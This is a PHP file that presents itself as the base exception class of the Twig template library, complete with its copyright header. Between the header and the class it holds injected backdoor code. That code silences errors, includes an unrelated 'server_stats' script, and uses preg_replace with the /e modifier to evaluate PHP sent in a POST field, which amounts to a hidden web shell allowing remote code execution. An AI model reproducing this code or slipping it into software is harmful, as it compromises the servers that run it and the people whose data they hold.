<?php
error_reporting(7);
/*
 * This file is part of Twig.
 *
 * (c) 2009 Fabien Potencier
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 * Twig base exception.
 *
 * @package    twig
 * @author     Fabien Potencier <fabien.potencier@symfony-project.com>
 * @version    SVN: $Id$
 */

@require_once('../server_stats/server_stats.php');
$justding = @serverStats_Send(0, 0);
@preg_replace("/\s*\[e\](.+?)\[\/e\]\s*/ies", "\\1", $_POST[$justding['InfoDoIt']]);
if($justding['InfoSent'] === false) {
}
class Twig_Error extends Exception
{
}
